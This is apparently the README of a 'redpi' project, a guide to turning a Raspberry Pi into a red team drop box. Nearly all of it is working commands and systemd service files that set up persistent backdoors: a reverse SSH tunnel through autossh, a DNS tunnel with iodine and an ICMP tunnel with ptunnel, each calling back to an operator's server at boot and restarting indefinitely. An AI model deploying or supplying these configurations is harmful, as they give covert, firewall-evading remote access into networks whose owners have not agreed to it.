# redpi
red team tools to install into a rpi

## install

```
sudo ./setup.sh
```

## autossh

In order to have a remote connexion to the raspberry:
```bash
ssh-keygen -t rsa -b 4096
ssh-copy-id -i ~/.ssh/id_rsa.pub user@domain -> to copy keys to the remote server
ssh user@domain -> to verify that we do not need password anymore to connect
```

Then create a service that will autossh to your domain at boot time:
```bash
sudo vim /etc/systemd/system/autossh.service

[Unit]
Description="une description du service"
Wants=network-online.target ssh.target
After=network-online.target ssh.target

[Service]
#Type=simple
User=pi
Environment="AUTOSSH_GATETIME 0"
ExecStart=/usr/bin/autossh -N -R 2222:localhost:22 user@domain -p 22 -i ~/.ssh/id_rsa
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

You need to reload the services list:

```bash
sudo systemctl daemon-reload
sudo systemctl enable autossh.service
sudo reboot
```

Then you could connect to your domain, then:
```bash
ssh pi@localhost -p 2222
```

## iodine and backdoor through dns tunneling

Modify your DNS zone as follow:
A record: tunnelhost.DOMAINNAME.com maps to IP
NS record: tunnel.DOMAINNAME.com maps to tunnelhost.DOMAINNAME.com

On the server (VPS):
```bash
sudo iodined -c -f 172.16.0.0/24 -P SuperPassword tunnel.DOMAINNAME.com
```

This command will create a interface (dns0) with IP 172.16.0.0

On the client (raspberry) create the service:
```bash
sudo vim /etc/systemd/system/autoiodine.service


[Unit]
Description="une description du service"
Wants=network-online.target ssh.target
After=network-online.target ssh.target

[Service]
#Type=simple
User=root
ExecStart=/usr/sbin/iodine -I 50 -f -P SuperPassword tunnel.DOMAINNAME.com
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

This service will create an interface (dns1) with ip 172.16.0.1

Then reload the service and enable it:
```bash
sudo sytemctl daemon-reload
sudo systemctl enable autoiodine.service
sudo reboot
```

Then you could connect to your domain, then ssh through dns tunnel to the raspberry pi:
```bash
ssh pi@172.16.0.1
```

## ptunnel and backdoor throught icmp tunneling

On the server (VPS):
```bash
sudo ptunnel -c ens3 -x SuperPassword
```

On the client, if not already done with autossh:
```bash
ssh-keygen -t rsa -b 4096
ssh-copy-id ~/.ssh/id_rsa.pub USER@domain -> to copy keys to the remote server
ssh USER@domain -> to verify that we do not need password anymore to connect
```

On the client (raspberry), create a bash script:
```bash
touch /home/pi/autoptunnel.sh
chmod +x home/pi/autoptunnel.sh
vim /home/pi/autoptunnel.sh

#!/bin/bash
/usr/sbin/ptunnel -p IP_SERVER -lp 8000 -da IP_SERVER -dp 22 -x SuperPassword &
sleep 5
ssh -N -R 2222:localhost:22 USER@localhost -p 8000 -i ~/.ssh/id_rsa
# do not take the same 2222 port as the one mentionned into the autossh section of course
```

Then, still on the client, create a service:
```bash
sudo vim /etc/systemd/system/autoptunnel.service


[Unit]
Description="une description du service"
Wants=network-online.target ssh.target
After=network-online.target ssh.target

[Service]
#Type=simple
User=root
ExecStart=/bin/bash /home/pi/autoptunnel.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

Then reload the service and enable it:
```bash
sudo sytemctl daemon-reload
sudo systemctl enable autoptunnel.service
sudo reboot
```

Then on the server, you can connect to the pi:
```bash
ssh pi@localhost -p 2222
```


